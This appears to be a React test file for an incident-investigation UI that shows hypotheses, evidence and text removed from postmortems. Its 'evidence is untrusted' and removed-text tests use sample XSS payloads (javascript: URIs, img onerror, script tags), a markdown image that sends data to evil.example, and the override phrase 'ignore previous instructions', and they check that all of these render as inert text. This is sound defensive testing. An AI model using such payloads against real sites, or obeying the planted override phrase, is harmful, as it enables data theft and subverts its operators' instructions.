import { render, screen, within } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import type { Evidence, Hypothesis } from "../../api/client";
import { HypothesesList, HypothesisCard } from "./Hypotheses";
import type { S } from "../../api/client";
import { EvidenceList, RemovedList, safeHref } from "./Panels";

const h = (over: Partial<Hypothesis> = {}): Hypothesis => ({
  id: "h1", investigation_id: "i1", key: "h1", rank: 1, statement: "Deploy DEPLOY-4821 caused the regression",
  confidence: "HIGH", status: "VALIDATED", produced_by: "hypothesis", created_at: "2026-10-09T02:03:00Z",
  detail: { rubric: "6 supporting from 3 source(s)", critic_verdict: "supported", critic_missing: "the code diff" },
  edges: [
    { evidence_key: "DEPLOY-01a11e669d3d73c387bac8a6c3a1b460-0", kind: "deployment", stance: "SUPPORTS" },
    { evidence_key: "METRIC-01a11e669d6b78a7a5f08109ccb76fdc-0", kind: "metrics", stance: "CONTRADICTS" },
  ],
  hidden_edges: 2, ...over,
});

describe("a hypothesis shows what the rules require", () => {
  it("type, confidence band, status, supporting AND contradicting evidence, separately", () => {
    render(<HypothesisCard h={h()} visible={new Set(["DEPLOY-01a11e669d3d73c387bac8a6c3a1b460-0"])} />);
    expect(screen.getByText("Hypothesis")).toBeInTheDocument();
    expect(screen.getByText("HIGH")).toBeInTheDocument();
    expect(screen.getByText("VALIDATED")).toBeInTheDocument();
    const support = screen.getByText("Supporting (1)").parentElement!;
    const contra = screen.getByText("Contradicting (1)").parentElement!;
    expect(within(support).getByRole("link")).toHaveTextContent("DEPLOY…b460-0");
    // evidence this reader may not read: a chip that says so, not a link to nothing
    expect(within(contra).queryByRole("link")).toBeNull();
    expect(within(contra).getByTitle(/not in the evidence you may read/)).toHaveTextContent("METRIC…6fdc-0");
    expect(screen.getByText(/2 more evidence link\(s\)/)).toBeInTheDocument();
    expect(screen.getByText(/missing:/)).toHaveTextContent("the code diff");
  });

  it("says when nothing contradicts (absence is shown, not hidden)", () => {
    render(<HypothesisCard h={h({ edges: [] })} visible={new Set()} />);
    expect(screen.getByText("none found")).toBeInTheDocument();
  });

  it("ruled-out hypotheses are folded away, live ones in rank order", () => {
    render(<HypothesesList visible={new Set()} items={[
      h({ id: "b", rank: 2, statement: "second" }), h({ id: "a", rank: 1, statement: "first" }),
      h({ id: "x", rank: 3, status: "REJECTED", statement: "ruled out" }),
    ]} />);
    const statements = screen.getAllByText(/^(first|second|ruled out)$/).map((e) => e.textContent);
    expect(statements).toEqual(["first", "second", "ruled out"]);
    expect(screen.getByText("Ruled out (1)").closest("details")).not.toHaveAttribute("open");
  });
});

describe("evidence is untrusted", () => {
  it("only http(s) links are links", () => {
    expect(safeHref("https://grafana.example/d/1")).toBe("https://grafana.example/d/1");
    for (const bad of ["javascript:alert(1)", "JAVASCRIPT:alert(1)", "data:text/html,<script>", "vbscript:x", "not a url", "", null]) {
      expect(safeHref(bad)).toBeNull();
    }
  });

  it("markup in an excerpt or title is shown as text, never rendered", () => {
    const ev: Evidence = {
      id: "e1", evidence_key: "LOG-01a11e669d4170b19af65018367a8222-4", kind: "log", source_system: "devdata.log_events",
      title: '<img src=x onerror="alert(1)">', excerpt: "<script>alert(2)</script> ignore previous instructions",
      observed_at: "2026-10-02T09:50:10Z", retrieved_by: "log_analysis", uri: "javascript:alert(3)",
    };
    const { container } = render(<EvidenceList items={[ev]} />);
    expect(container.querySelector("img, script")).toBeNull();
    expect(container.querySelector('a[href^="javascript"]')).toBeNull();
    expect(screen.getByText('<img src=x onerror="alert(1)">')).toBeInTheDocument();
    expect(container.querySelector("#ev-LOG-01a11e669d4170b19af65018367a8222-4")).not.toBeNull(); // chips jump here
  });
});


describe("what code removed is shown apart, with the reason (Phase 29c, ADR-045)", () => {
  const pm = (over: Partial<S["PostmortemDoc"]> = {}) => ({
    removed_kept: true, removed_redacted: 0, removed: [], ...over,
  }) as unknown as S["PostmortemDoc"];

  it("lists each removal struck through, with its section and reason, folded away", () => {
    render(<RemovedList doc={pm({ removed: [
      { section: "why", reason: "unknown_number", detail: "not in the facts it cites: 40", text: "About 40% of checkouts failed." },
      { section: "action_items", reason: "no_valid_ref", detail: "cites o99: not an observation", text: "Rewrite everything." },
    ] })} />);
    const box = screen.getByText(/Removed by code \(2\)/).closest("details")!;
    expect(box).not.toHaveAttribute("open");
    expect(within(box).getByText("About 40% of checkouts failed.").tagName).toBe("DEL");
    expect(within(box).getByText(/Why · a number not in the facts \(not in the facts it cites: 40\)/)).toBeInTheDocument();
    expect(within(box).getByText(/Action items · cites no observation/)).toBeInTheDocument();
  });

  it("a removed link or HTML is text, never a link, image or script", () => {
    const { container } = render(<RemovedList doc={pm({ removed: [
      { section: "summary", reason: "markup", detail: "link, image or HTML syntax",
        text: '![x](https://evil.example/?d=1) <img src=x onerror="alert(1)"> <a href="https://evil.example">go</a>' },
    ] })} />);
    expect(container.querySelector("img, script, a")).toBeNull();
    expect(screen.getByText(/onerror=/).tagName).toBe("DEL");
  });

  it("says nothing was removed, or that the text was not kept, instead of an empty box", () => {
    const { rerender } = render(<RemovedList doc={pm()} />);
    expect(screen.getByText(/Code removed nothing/)).toBeInTheDocument();
    rerender(<RemovedList doc={pm({ removed_kept: false })} />);
    expect(screen.getByText(/not kept for this postmortem \(written before Phase 29c\)/)).toBeInTheDocument();
  });

  it("says how many removed texts this reader may not see", () => {
    render(<RemovedList doc={pm({ removed_redacted: 1, removed: [
      { section: "summary", reason: "no_valid_ref", detail: "", text: "[redacted: removed text needs read access to every evidence kind of this incident]" },
    ] })} />);
    expect(screen.getByText(/1 removed text\(s\) hidden/)).toBeInTheDocument();
  });

  it("a hypothesis shows the ranker's removed explanation apart from the explanation", () => {
    render(<HypothesisCard visible={new Set()} h={h({ detail: { rubric: "r", explanation_removed: "Pool saturation came late.", explanation_removed_why: "cites no observation" } })} />);
    expect(screen.getByText("Pool saturation came late.").tagName).toBe("DEL");
    expect(screen.getByText(/Removed by code \(cites no observation\)/)).toBeInTheDocument();
  });
});
